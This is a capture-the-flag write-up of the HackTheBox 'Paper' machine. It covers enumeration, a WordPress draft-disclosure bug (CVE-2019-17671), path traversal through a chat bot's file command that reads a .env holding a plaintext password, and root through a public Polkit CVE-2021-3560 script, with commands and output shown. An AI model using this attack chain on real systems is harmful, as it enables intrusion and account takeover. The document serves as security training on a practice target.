#linux
# Enumeration
## nmap

```
nmap -sC -sV paper.htb                                                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 20:45 EST
Nmap scan report for paper.htb (10.129.136.31)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 1005ea5056a600cb1c9c93df5f83e064 (RSA)
|   256 588c821cc6632a83875c2f2b4f4dc379 (ECDSA)
|_  256 3178afd13bc42e9d604eeb5d03eca022 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.86 seconds
```


## Gobuster
```
gobuster dir -u http://paper.htb -w /usr/share/wordlists/dirb/common.txt -t 50            
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://paper.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/17 20:48:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 232] [--> http://paper.htb/manual/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/17 20:48:25 Finished
===============================================================
```

## Feroxbuster
```
feroxbuster -u http://paper.htb/cgi-bin/ -x sh,cgi,pl
```

nothing interesing in cgi-bin at the moment

## Check the website

### curl
```
curl -I http://paper.htb
HTTP/1.1 403 Forbidden
Date: Sat, 18 Feb 2023 01:59:16 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

office.paper?
add office.paper to /etc/hosts
### wfuzz

```
wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

000000710:   403        70 L     2438 W     199691 Ch   "www9"                                                  
000000682:   403        70 L     2438 W     199691 Ch   "autodiscover.support"                                  
000000686:   403        70 L     2438 W     199691 Ch   "iris"                                                  
000000645:   403        70 L     2438 W     199691 Ch   "green"                                                 
000000717:   403        70 L     2438 W     199691 Ch   "fax"                                                   
000000680:   403        70 L     2438 W     199691 Ch   "start"                                                 
000000718:   403        70 L     2438 W     199691 Ch   "alfa"                                                  
000000721:   403        70 L     2438 W     199691 Ch   "spb"                                                   
000000719:   403        70 L     2438 W     199691 Ch   "www.images"                                            
000000720:   403        70 L     2438 W     199691 Ch   "alex"                                                  
000000713:   403        70 L     2438 W     199691 Ch   "ci"                                                    
000000716:   403        70 L     2438 W     199691 Ch   "audio"                                                 
000000715:   403        70 L     2438 W     199691 Ch   "open"                                                  
000000711:   403        70 L     2438 W     199691 Ch   "w1"      
```

it shows me way too many options with characters equal to 199691 so we will try it without them

#### Fuzz again
```
wfuzz -u http://office.paper -H "Host: FUZZ.office.paper" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 199691
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://office.paper/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                      
=====================================================================

000000070:   200        507 L    13015 W    223163 Ch   "chat"    
```

add chat.office.paper to /etc/hosts


### office.paper

![[Pasted image 20230218111131.png]]

### Comment
![[Pasted image 20230218112537.png]]

Seems like there is a vuln we can exploit.

#### php
has php

#### feroxbuster again
```
feroxbuster -u http://office.paper -x php
301      GET        7l       20w      240c http://office.paper/wp-includes => http://office.paper/wp-includes/
301      GET        7l       20w      239c http://office.paper/wp-content => http://office.paper/wp-content/
301      GET        7l       20w      237c http://office.paper/wp-admin => http://office.paper/wp-admin/
200      GET      235l     1209w        0c http://office.paper/
301      GET        7l       20w      247c http://office.paper/wp-includes/images => http://office.paper/wp-includes/images/
301      GET        7l       20w      243c http://office.paper/wp-includes/js => http://office.paper/wp-includes/js/
301      GET        7l       20w      244c http://office.paper/wp-includes/css => http://office.paper/wp-includes/css/
200      GET        0l        0w        0c http://office.paper/wp-includes/category.php
200      GET        0l        0w        0c http://office.paper/wp-includes/cache.php
500      GET        0l        0w        0c http://office.paper/wp-includes/media.php
200      GET        0l        0w        0c http://office.paper/wp-includes/user.php
```

wp is running it seems like

### chat.office.paper
![[Pasted image 20230218112745.png]]
Login form and I could not find anything so interesiting.

## WP-scan

```
wpscan --url http://office.paper --api-token <your token>
[+] URL: http://office.paper/ [10.129.136.31]
[+] Started: Fri Feb 17 21:22:08 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |
 | [!] 48 vulnerabilities identified:


[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <===============================================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 73

[+] Finished: Fri Feb 17 21:22:26 2023
[+] Requests Done: 182
[+] Cached Requests: 5
[+] Data Sent: 44.095 KB
[+] Data Received: 12.437 MB
[+] Memory used: 231.699 MB
[+] Elapsed time: 00:00:17
                                     
```

Wordpress version is 5.2.3

```
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
```

This vuln talks about view private/draft posts.


# Foothold

## CVE-2019-17671

https://www.exploit-db.com/exploits/47690

```md
So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format


In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
```

## http://office.paper/?static=1

```md
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,  
WRITTEN AND DIRECTED BY  
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

## registration

register as a user and then check general channel
![[Pasted image 20230218123614.png]]

```
kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.

-   Most frequently asked questions include:
    
-   - What time is it?
    
-   - What new files are in your sales directory?
    
-   - Why did the salesman crossed the road?
    
-   - What's the content of file x in your sales directory? etc.
    

-   Please note that I am a beta version and I still have some bugs to be fixed.
    

-   How to use me ? :
    
-   1. Small Talk:
    
-   You can ask me how dwight's weekend was, or did he watched the game last night etc.
    
-   eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
    

-   2. Joke:
    
-   You can ask me Why the salesman crossed the road.
    
-   eg: 'recyclops why did the salesman crossed the road?'
    

-   <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
    

-   For security reasons, the access is limited to the Sales folder.
    

-   3. Files:
    
-   eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
    

-   4. List:
    
-   You can ask me to list the files
    

-   5. Time:
    
-   You can ask me to what the time is
    
-   eg: 'recyclops what time is it?' or just 'recyclops time'
```

## Recyclops

![[Pasted image 20230218123815.png]]

## hubot/.env file

```
total 184  
drwx------ 8 dwight dwight 4096 Sep 16 2021 .  
drwx------ 11 dwight dwight 281 Feb 6 2022 ..  
-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \  
srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000  
srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080  
drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin  
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env  
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json  
drwx------ 8 dwight dwight 163 Jul 3 2021 .git  
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore  
-rw-r--r-- 1 dwight dwight 66960 Feb 17 22:39 .hubot.log  
-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE  
drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules  
drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak  
-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json  
-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak  
-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json  
-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile  
-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 [README.md](http://README.md)  
drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts  
-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_[bot.sh](http://bot.sh)  
drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode  
-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
```

```
file ../hubot/.env

-   <!=====Contents of file ../hubot/.env=====>
    
-   export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
    export ROCKETCHAT_USER=recyclops  
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
    export ROCKETCHAT_USESSL=false  
    export RESPOND_TO_DM=true  
    export RESPOND_TO_EDITED=true  
    export PORT=8000  
    export BIND_ADDRESS=127.0.0.1
    
-   <!=====End of file ../hubot/.env=====>
```

the owner of the file is dwight

## ssh login

I first tried with recyclops, but I could not login

as dwight i could login

```
ssh dwight@paper.htb
dwight@paper.htb's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Fri Feb 17 22:43:38 EST 2023 from 10.10.14.44 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 

```

# Privilege escalation
## Enumeration

### sudo -l
`Sorry, user dwight may not run sudo on paper.`

## linpeas

setup a server in `/usr/share/peass/linpeas`
`python -m http.server 8080`

on dwight machine 
`wget http://10.10.14.44:8080/linpeas.sh`
`chmod +x linpeas.sh`

#### Collect CVEs

```shell
╔══════════╣ CVEs Check
Potentially Vulnerable to CVE-2022-2588       
```

```shell
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                            
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                                                                          

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

```

I was not really able to understand the CVEs above so I watched ippsec's video.
https://www.youtube.com/watch?v=4e4wKDrANog

### dwight -> secnigma -> root
#### CVE-2021-3650
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

get it from kali machine and run it
```shell
[dwight@paper ~]$ ./poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```
we might need to try it several times
```
cat /etc/passwd

nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod:x:976:974:mongod:/var/lib/mongo:/bin/false
rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
dwight:x:1004:1004::/home/dwight:/bin/bash
secnigma:x:1005:1005:secnigma:/home/secnigma:/bin/bash
```
#### dwight -> secnigma
su secnigma: secnigmaftw (README.md has the password)
```
[dwight@paper ~]$ su secnigma
Password: 
[secnigma@paper dwight]$ whoami
secnigma
```

#### secnigma -> root
```
[secnigma@paper dwight]$ sudo bash
[sudo] password for secnigma: 
[root@paper dwight]# whoami
root
```
then `sudo bash`

#### Rootflag
```
cd ~
cat root.txt
```
